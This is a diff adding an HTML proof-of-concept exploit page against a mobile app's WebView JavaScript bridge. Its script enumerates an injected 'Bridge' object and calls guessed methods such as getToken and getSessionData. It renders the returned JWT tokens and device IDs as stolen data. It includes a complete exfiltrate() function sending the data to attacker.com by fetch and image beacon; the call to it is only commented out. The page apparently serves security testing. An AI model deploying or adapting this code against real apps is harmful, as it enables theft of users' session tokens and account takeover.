@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebView Bridge Exploit PoC</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            margin: 0;
+        }
+        h1 {
+            color: #ff0000;
+            text-align: center;
+            text-shadow: 0 0 10px #ff0000;
+            border-bottom: 2px solid #ff0000;
+            padding-bottom: 10px;
+        }
+        .log-container {
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid #333;
+        }
+        .log-entry:last-child {
+            border-bottom: none;
+        }
+        .log-success { color: #00ff00; }
+        .log-error { color: #ff0000; }
+        .log-warning { color: #ffaa00; }
+        .log-info { color: #00aaff; }
+
+        .stolen-data {
+            background: #2a0000;
+            border: 3px solid #ff0000;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 10px #ff0000; }
+            50% { box-shadow: 0 0 30px #ff0000; }
+        }
+
+        pre {
+            background: #000;
+            padding: 15px;
+            border-left: 4px solid #00ff00;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .timestamp {
+            color: #666;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <h1>🚨 WebView Bridge Security Test 🚨</h1>
+    <div class="log-container" id="logContainer"></div>
+    <div id="stolenDataContainer"></div>
+
+    <script>
+        // ============================================
+        // Logging Functions
+        // ============================================
+
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            logEntry.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
+
+            document.getElementById('logContainer').appendChild(logEntry);
+            console.log(`[${type.toUpperCase()}] ${message}`);
+
+            // Scroll to bottom
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        // ============================================
+        // Data Exfiltration Functions
+        // ============================================
+
+        function exfiltrate(data, endpoint = 'https://attacker.com/collect') {
+            log('📤 Attempting data exfiltration...', 'warning');
+
+            // Method 1: Fetch API
+            fetch(endpoint, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).catch(error => {
+                log('Fetch failed: ' + error.message, 'error');
+            });
+
+            // Method 2: Image beacon (fallback)
+            const img = new Image();
+            img.src = endpoint + '/beacon?data=' + encodeURIComponent(JSON.stringify(data));
+
+            log('✓ Exfiltration attempted via multiple channels', 'warning');
+        }
+
+        // ============================================
+        // Bridge Callback Handlers
+        // ============================================
+
+        // Generic callback for sensitive data
+        window.getAppInfo = function(data) {
+            log('🎯 getAppInfo callback triggered!', 'success');
+            log('📦 Data length: ' + data.length + ' bytes', 'info');
+
+            try {
+                const parsed = JSON.parse(data);
+                displayStolenData(parsed);
+
+                // Exfiltrate to attacker server (disabled for PoC)
+                // exfiltrate(parsed);
+
+                log('✅ Data successfully captured!', 'success');
+                return parsed;
+            } catch (e) {
+                log('❌ JSON parse error: ' + e.message, 'error');
+                log('Raw data: ' + data, 'info');
+                displayRawData(data);
+            }
+        };
+
+        // Additional callback handlers
+        window.onDataReceived = window.getAppInfo;
+        window.handleBridgeResponse = window.getAppInfo;
+
+        // ============================================
+        // Display Functions
+        // ============================================
+
+        function displayStolenData(data) {
+            const container = document.getElementById('stolenDataContainer');
+
+            const html = `
+                <div class="stolen-data">
+                    <h2 style="color:#ff0000;margin-top:0;">⚠️ SENSITIVE DATA EXPOSED ⚠️</h2>
+
+                    ${data.token ? `
+                        <h3>🔑 JWT Token:</h3>
+                        <pre>${data.token}</pre>
+                    ` : ''}
+
+                    ${data.bid ? `
+                        <h3>📱 Device ID:</h3>
+                        <pre>${data.bid}</pre>
+                    ` : ''}
+
+                    ${data.version ? `
+                        <p><strong>App Version:</strong> ${data.version}</p>
+                    ` : ''}
+
+                    ${data.platform ? `
+                        <p><strong>Platform:</strong> ${data.platform}</p>
+                    ` : ''}
+
+                    <h3>📋 Complete Payload:</h3>
+                    <pre>${JSON.stringify(data, null, 2)}</pre>
+                </div>
+            `;
+
+            container.innerHTML = html;
+        }
+
+        function displayRawData(data) {
+            const container = document.getElementById('stolenDataContainer');
+            container.innerHTML = `
+                <div class="stolen-data">
+                    <h2 style="color:#ffaa00;">⚠️ RAW DATA CAPTURED ⚠️</h2>
+                    <pre>${data}</pre>
+                </div>
+            `;
+        }
+
+        // ============================================
+        // Bridge Detection & Exploitation
+        // ============================================
+
+        log('🔍 Starting security test...', 'info');
+        log('📍 Page loaded at: ' + window.location.href, 'info');
+
+        // Detect Bridge object
+        if (typeof Bridge !== 'undefined') {
+            log('✅ Bridge object detected!', 'success');
+            log('🔧 Bridge type: ' + typeof Bridge, 'info');
+
+            // List Bridge methods
+            try {
+                const methods = Object.getOwnPropertyNames(Bridge);
+                log('📋 Available methods: ' + methods.join(', '), 'info');
+            } catch (e) {
+                log('Could not enumerate Bridge methods', 'warning');
+            }
+
+            // Attempt exploitation
+            log('🎯 Attempting to call Bridge methods...', 'warning');
+
+            setTimeout(() => {
+                // Try common method names
+                const methodsToTry = [
+                    'getAppInfo',
+                    'getUserInfo',
+                    'getToken',
+                    'getSessionData',
+                    'postMessage'
+                ];
+
+                methodsToTry.forEach(method => {
+                    try {
+                        if (typeof Bridge[method] === 'function') {
+                            log(`Calling Bridge.${method}()...`, 'warning');
+                            Bridge[method]('getAppInfo');
+                        }
+                    } catch (e) {
+                        log(`${method} failed: ${e.message}`, 'error');
+                    }
+                });
+
+                // Try postMessage with variations
+                if (typeof Bridge.postMessage === 'function') {
+                    const messages = [
+                        'getAppInfo',
+                        '{"type":"getAppInfo"}',
+                        '{"action":"getUserData"}',
+                        '{"cmd":"getSession"}'
+                    ];
+
+                    messages.forEach(msg => {
+                        try {
+                            log(`Sending: ${msg}`, 'warning');
+                            Bridge.postMessage(msg);
+                        } catch (e) {
+                            log(`Failed: ${e.message}`, 'error');
+                        }
+                    });
+                }
+            }, 1000);
+
+        } else {
+            log('❌ Bridge object NOT found', 'error');
+            log('ℹ️ This page may not be loaded in the vulnerable WebView', 'info');
+            log('ℹ️ Possible reasons:', 'info');
+            log('  • Not in the target application context', 'info');
+            log('  • Bridge not initialized yet', 'info');
+            log('  • Application has been patched', 'info');
+        }
+
+        // Additional detections
+        log('🔍 Checking for other injection points...', 'info');
+
+        const dangerousAPIs = [
+            'webkit',
+            'Android',
+            'AndroidInterface',
+            'JavaScriptInterface'
+        ];
+
+        dangerousAPIs.forEach(api => {
+            if (typeof window[api] !== 'undefined') {
+                log(`⚠️ Found potential interface: ${api}`, 'warning');
+            }
+        });
+
+        log('✓ Security test initialization complete', 'success');
+    </script>
+</body>
+</html>
